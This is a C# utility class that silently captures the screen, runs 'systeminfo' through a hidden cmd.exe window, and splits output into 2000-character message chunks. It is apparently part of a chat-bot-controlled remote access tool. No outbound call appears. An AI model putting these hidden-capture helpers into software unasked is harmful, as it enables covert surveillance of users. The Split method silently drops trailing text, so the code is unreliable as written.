using System.Drawing;
using System.Diagnostics;
using System.Data;

public static class Utils {
    public static MemoryStream GetScreenshot()
    {
        var bitmap = new Bitmap(1920, 1080);
        var graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
        var stream = new MemoryStream();
        bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
        stream.Position = 0;
        return stream;
    }

    public static string GetSystemInfo()
    {
        Process process = new Process();
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.FileName = "cmd.exe";
        startInfo.Arguments = "/C systeminfo";
        startInfo.RedirectStandardOutput = true;
        startInfo.UseShellExecute = false;
        process.StartInfo = startInfo;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }

    public static IEnumerable<string> Split(string str, int chunkSize)
    {
        return Enumerable.Range(0, str.Length / chunkSize)
            .Select(i => str.Substring(i * chunkSize, chunkSize));
    }

    public static IEnumerable<string> CommandOutputWrapper(string output)
    {
        IEnumerable<string> chunks = Split(output, 2000-8);
        foreach (string chunk in chunks)
        {
            yield return $"```\n{chunk}\n```";
        }
    }

    public static IEnumerable<string> MessageWrapper(string output)
    {
        IEnumerable<string> chunks = Split(output, 2000);
        foreach (string chunk in chunks)
        {
            yield return $"{chunk}";
        }
    }
}
